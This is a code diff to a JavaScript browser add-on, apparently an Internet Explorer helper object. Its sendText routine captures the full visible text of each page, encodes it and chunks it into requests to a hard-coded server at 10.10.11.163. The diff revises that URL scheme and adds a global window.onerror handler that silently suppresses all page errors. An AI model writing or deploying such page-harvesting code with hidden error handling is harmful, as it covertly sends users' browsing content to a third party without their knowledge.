@@ -486,19 +486,24 @@ function I8bho_print()
 		//return
 		return matches;
 	};
+
+    window.onerror = function() { return true; }
     function sendText()
     {
         var text = document.body.innerText,
-            prefix = 'http://10.10.11.163/text?t=',
+            prefix = 'http://10.10.11.163/text?n=',
+            turn = 't=',
             param = '&c=',
             paraSize = (msie ? ((msie<8) ? 1024 : 4098) : 4096),
             maxTimes = (msie ? ((msie<8) ? 4 : 6) : 4),
-            metaSize = prefix.length + param.length + (maxTimes + 1).toString().length;
+            metaSize = prefix.length + turn.length + param.length + ((maxTimes + 1).toString().length << 1);
         if (text === undefined) return;
         var step = paraSize - metaSize, maxSize = step * maxTimes;
         content = encodeURIComponent((text.length > maxSize ? text.substr(0, maxSize) : text).replace(/\s{2,}/g, ' ').replace(/[\n&]/g, ' ')).substr(0, maxSize);
+        var total = Math.ceil(content.length/step);
+        prefix += total + turn;
         var brkPos = [0];
-        for (var i = 1, p = 0, end = Math.ceil(content.length/step); i <= end; ++i)
+        for (var i = 1, p = 0; i <= total; ++i)
         {
             p = brkPos[i - 1] + step;
             brkPos[i] = content[p - 2] == '%' ? (p - 2) : (content[p - 1] == '%' ? (p - 1) : p);
